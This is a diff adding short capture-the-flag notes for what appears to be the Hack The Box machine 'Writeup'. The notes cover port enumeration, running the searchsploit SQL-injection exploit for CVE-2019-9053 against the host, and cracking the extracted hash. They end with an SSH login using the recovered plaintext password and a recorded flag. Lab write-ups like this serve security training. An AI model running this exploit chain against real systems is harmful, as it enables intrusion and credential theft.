@@ -1,0 +1,41 @@
+#10.10.10.138
+#PORT= 22,80
+
+#dirb- nothing
+
+found '/writeup' dir inside robots.txt
+
+go through website... http://writeup.htb/writeup/
+
+after checking the source code of found 'cms mode sample'
+
+searchsploit has exploit for this that uses sql injection
+'CVE-2019-9053'
+
+cmd> searchsploit -m exploits/php/webapps/46635.py
+
+running script
+
+cmd> python 46635.py -u http://writeup.htb/writeup -c
+
+after running the script found credentials
+
+Salt for password found: 5a599ef579066807
+Username found: jkre
+Email found: jkr@writeup.71
+Try: 62def4866937f08cc13bab43bb14e6f7$
+
+
+we didn't get the cracked value...so copy the 'crack_passwd()' from script and create new script.
+
+check out the file 'crack_passwd.py'
+
+found the cracked value:- 'raykayjay9'
+
+now login to ssh using creds
+#USER:   jkr
+#PASSWD: raykayjay9
+
+
+#key
+d4e493fd4068afc9eb1aa6a55319f978
